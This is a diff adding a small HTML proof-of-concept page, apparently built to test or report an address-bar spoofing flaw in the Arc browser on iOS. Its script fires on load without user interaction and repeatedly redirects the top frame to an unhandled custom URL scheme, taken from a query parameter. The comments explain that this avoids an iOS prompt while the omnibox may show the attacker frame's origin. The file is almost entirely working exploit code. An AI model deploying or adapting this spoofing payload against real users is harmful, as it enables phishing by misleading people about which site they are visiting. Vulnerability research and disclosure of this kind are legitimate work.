@@ -1,0 +1,15 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>.</title></head>
+<body>
+<script>
+// Zero-click: fires on load (allow-top-navigation, no gesture needed).
+// Uses a non-web scheme with NO registered handler -> iOS shows NO "open app?" prompt,
+// but Arc's non-web-scheme handling may still update the omnibox to this frame's origin.
+var s = new URLSearchParams(location.search).get('s') || 'x-arc-spoof-nohandler://a';
+try { top.location.href = s; } catch (e) {}
+// second attempt (unhandled schemes fail silently -> top frame not committed -> this frame survives)
+setTimeout(function () { try { top.location.href = s; } catch (e) {} }, 800);
+</script>
+</body>
+</html>
